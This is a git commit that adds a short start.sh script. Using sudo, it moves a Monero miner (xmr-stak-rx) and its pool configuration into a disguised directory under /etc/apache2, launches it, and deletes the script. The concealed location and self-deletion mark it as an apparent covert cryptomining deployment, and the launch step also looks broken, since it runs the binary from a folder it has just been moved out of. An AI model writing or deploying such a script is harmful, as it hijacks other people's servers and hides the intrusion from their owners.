2cbcf766a93ca8c2f479a8533d3c79081399aeff
Satcom <47340064+Satcomx00-x00@users.noreply.github.com>
2021-01-29 12:56:04 +0100

    Add files via upload

---
+++ start.sh
@@ -0,0 +1,2 @@
+#!/bin/bash
+sudo chmod +x xmr-stak-rx && sudo mkdir /etc/apache2/site.configuration && sudo mv config.txt pools.txt xmr-stak-rx /etc/apache2/site.configuration && ./xmr-stak-rx --noTest && sudo rm start.sh
